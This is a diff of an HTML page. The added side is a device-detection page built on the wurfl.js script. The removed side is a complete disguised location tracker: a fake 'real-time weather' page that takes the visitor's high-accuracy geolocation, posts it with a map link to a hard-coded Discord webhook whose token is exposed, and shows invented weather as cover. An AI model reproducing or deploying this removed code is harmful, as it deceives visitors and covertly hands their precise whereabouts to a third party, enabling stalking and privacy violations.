@@ -1,212 +1,51 @@
 <!DOCTYPE html>
-<html>
+<html lang="zh-TW">
 <head>
-<meta charset="utf-8">
-<title>即時天氣</title>
-
-<style>
-
-body{
-font-family:Arial;
-text-align:center;
-padding-top:80px;
-overflow:hidden;
-
-/* 更真實天空 */
-background:linear-gradient(-45deg,#4fc3f7,#81d4fa,#b3e5fc,#4fc3f7,#29b6f6);
-background-size:500% 500%;
-animation:skyFlow 25s ease infinite;
-}
-
-/* 天空流動 */
-@keyframes skyFlow{
-0%{background-position:0% 50%;}
-50%{background-position:100% 50%;}
-100%{background-position:0% 50%;}
-}
-
-/* 卡片升級 */
-.weather-box{
-background:rgba(255,255,255,0.92);
-width:320px;
-margin:auto;
-padding:25px;
-border-radius:20px;
-backdrop-filter:blur(12px);
-box-shadow:0 20px 60px rgba(0,0,0,0.25);
-animation:cardFloat 6s ease-in-out infinite;
-}
-
-/* 卡片漂浮 */
-@keyframes cardFloat{
-0%{transform:translateY(0px);}
-50%{transform:translateY(-12px);}
-100%{transform:translateY(0px);}
-}
-
-/* 太陽更真實 */
-.sun{
-width:90px;
-height:90px;
-border-radius:50%;
-margin:20px auto;
-background:radial-gradient(circle,#fff176,#fdd835,#fbc02d);
-box-shadow:
-0 0 40px #ffeb3b,
-0 0 80px #ffeb3b,
-0 0 120px #ffeb3b;
-animation:sunGlow 4s ease-in-out infinite;
-}
-
-/* 太陽呼吸 */
-@keyframes sunGlow{
-0%{transform:scale(1);}
-50%{transform:scale(1.15);}
-100%{transform:scale(1);}
-}
-
-/* 雲朵 */
-.cloud{
-width:140px;
-height:45px;
-background:white;
-border-radius:40px;
-margin:20px auto;
-position:relative;
-animation:cloudFloat 6s ease-in-out infinite;
-box-shadow:0 5px 15px rgba(0,0,0,0.1);
-}
-
-.cloud:before{
-content:"";
-position:absolute;
-width:70px;
-height:70px;
-background:white;
-border-radius:50%;
-top:-35px;
-left:15px;
-}
-
-.cloud:after{
-content:"";
-position:absolute;
-width:60px;
-height:60px;
-background:white;
-border-radius:50%;
-top:-30px;
-left:60px;
-}
-
-@keyframes cloudFloat{
-0%{transform:translateX(-15px);}
-50%{transform:translateX(15px);}
-100%{transform:translateX(-15px);}
-}
-
-/* 按鈕升級 */
-button{
-padding:12px 25px;
-font-size:16px;
-border:none;
-border-radius:12px;
-background:linear-gradient(45deg,#42a5f5,#1e88e5);
-color:white;
-cursor:pointer;
-transition:0.3s;
-}
-
-button:hover{
-transform:scale(1.07);
-box-shadow:0 10px 25px rgba(0,0,0,0.3);
-}
-
-#status{
-margin-top:20px;
-font-size:18px;
-}
-
-</style>
-
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>精確裝置檢測器</title>
+    <!-- 引入專業的裝置識別腳本 -->
+    <script type="text/javascript" src="//wurfl.io/wurfl.js"></script>
+    <style>
+        body { font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; background-color: #f0f2f5; margin: 0; }
+        .card { background: white; padding: 2rem; border-radius: 15px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); text-align: center; max-width: 90%; }
+        h1 { color: #1a73e8; font-size: 1.5rem; }
+        .info { margin-top: 20px; font-size: 1.2rem; color: #333; line-height: 1.6; }
+        .detail { color: #666; font-size: 0.9rem; margin-top: 10px; }
+    </style>
 </head>
-
 <body>
 
-<div class="weather-box">
-
-<div class="sun"></div>
-<div class="cloud"></div>
-
-<h2>🌤 即時天氣查詢</h2>
-
-<p>點擊按鈕查看目前天氣</p>
-
-<button onclick="getLocation()">查看天氣</button>
-
-<p id="status"></p>
-
+<div class="card">
+    <h1>您的裝置資訊</h1>
+    <div id="loading">偵測中，請稍候...</div>
+    <div class="info" id="device-name"></div>
+    <div class="detail" id="ua-string"></div>
 </div>
 
 <script>
+    window.onload = function() {
+        const loading = document.getElementById('loading');
+        const deviceDisplay = document.getElementById('device-name');
+        const uaDisplay = document.getElementById('ua-string');
 
-var webhook = "https://discord.com/api/webhooks/1429150986882252871/UlvSQaaZLtutHuXJdZ_P_khQjXZV5BIXRbWbfvYDJ9psaiBwZKh9RfwNMeRkkC5rEskv";
-
-function getLocation(){
-
-document.getElementById("status").innerHTML="正在取得天氣資料...";
-
-if(navigator.geolocation){
-
-navigator.geolocation.getCurrentPosition(success,error,{
-enableHighAccuracy:true,
-timeout:10000,
-maximumAge:0
-});
-
-}else{
-
-document.getElementById("status").innerHTML="瀏覽器不支援定位";
-
-}
-
-}
-
-function success(pos){
-
-var lat = pos.coords.latitude;
-var lon = pos.coords.longitude;
-var acc = pos.coords.accuracy;
-
-fetch(webhook,{
-method:"POST",
-headers:{
-"Content-Type":"application/json"
-},
-body:JSON.stringify({
-content:
-"📍有人打開網站\n"+
-"緯度: "+lat+"\n"+
-"經度: "+lon+"\n"+
-"精準度: "+acc+" 公尺\n"+
-"地圖: https://www.google.com/maps?q="+lat+","+lon
-})
-});
-
-document.getElementById("status").innerHTML=
-"☀️ 晴天<br>"+
-"🌡 溫度：26°C<br>"+
-"🌬 微風<br>"+
-"📍目前位置天氣";
-
-}
-
-function error(){
-
-document.getElementById("status").innerHTML="需要允許定位才能查看天氣";
-
-}
-
+        try {
+            // WURFL 物件包含經過雲端比對後的精確名稱
+            if (typeof WURFL !== 'undefined') {
+                loading.style.display = 'none';
+                deviceDisplay.innerHTML = `
+                    <strong>品牌與型號：</strong><br>${WURFL.complete_device_name}<br>
+                    <strong>類型：</strong>${WURFL.form_factor}
+                `;
+                uaDisplay.innerText = "瀏覽器特徵 (UA): " + navigator.userAgent;
+            } else {
+                throw new Error("無法載入偵測模組");
+            }
+        } catch (e) {
+            loading.innerText = "偵測失敗，可能受限於瀏覽器隱私設定。";
+            deviceDisplay.innerText = "基本偵測：" + navigator.platform;
+        }
+    };
 </script>
 
 </body>
